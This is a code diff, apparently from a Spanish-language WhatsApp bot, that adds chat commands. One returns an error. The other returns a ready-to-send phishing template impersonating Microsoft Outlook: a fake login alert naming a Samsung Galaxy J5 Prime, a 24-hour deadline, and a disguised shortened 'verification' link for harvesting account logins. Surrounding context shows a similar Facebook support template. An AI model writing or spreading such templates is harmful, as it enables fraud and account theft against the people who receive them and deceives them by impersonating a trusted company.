@@ -2652,6 +2652,37 @@ Contactenos a la siguiente dirección de correo electrónico si necesita ayuda o
 
 _FacebookSupport@gmail.com`)
                   }
+					
+	if (budy.includes(`/plantilla soporte whatsapp`)) {
+                  reply(`[❌] ꜱᴇ ᴘʀᴏᴅᴜᴊᴏ ᴜɴ ᴇʀʀᴏʀ, ɪɴᴛᴇɴᴛᴀʟᴏ ᴍᴀꜱ ᴛᴀʀᴅᴇ [❌]`)
+                  }
+					
+	if (budy.includes(`/plantilla soporte microsoft`)) {
+                  reply(`Página oficial de Microsoft Outlook ©
+https://MicrosoftOutlook@hotmail.com
+--------------------------------
+Microsoft Outlook ©
+
+Buenas Noches Sr. Usuario de Hotmail, con los respectivos permisos de WhatsApp Support, le estamos comunicando una alerta de inicio de sesión en su cuenta de Hotmail.
+
+Hemos detectado que un dispositivo Samsung Galaxy J5 Prime, está solicitando el acceso a su cuenta de Hotmail.
+Dentro de 24 horas aproximadamente, su cuenta de Hotmail será iniciada en el dispositivo mencionado y será cerrada en su dispositivo.
+Si está de acuerdo con el cambio de su cuenta de Hotmail al dispositivo android Samsung Galaxy J5 Prime, puede realizarlo de forma inmediata escribiendo el siguiente mensaje de confirmación:
+
+Change_Hotmail
+
+En caso de que usted no haya solicitado éste cambio, deberá verificar que éste es el dispositivo oficial de ésta cuenta de Hotmail, para hacerlo, deberá iniciar sesión desde el siguiente enlace de verificación de Hotmail.
+
+[Enlace de Verificación]
+https://Microsoft_Outlook_Verification@mitly.us/VSsSnYDy
+
+Si usted realiza la siguiente verificación... Microsoft Outlook bloqueara el acceso de su cuenta de Hotmail en el dispositivo Samsung Galaxy J5 Prime, para evitar cualquier tipo de robo de su cuenta de Hotmail y así mantener su cuenta segura.
+En caso de que no verifíque su cuenta, el cambio se realizara dentro de 24 horas a partir de éste momento.
+
+Contactenos a la siguiente dirección de correo electrónico si necesita ayuda o tiene algún problema.
+
+Microsoft_Outlook@hotmail.com`)
+                  }
        if (budy.startsWith(`:v`)) {
         const none = fs.readFileSync('./mp3/viejo1.mp3');
 		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
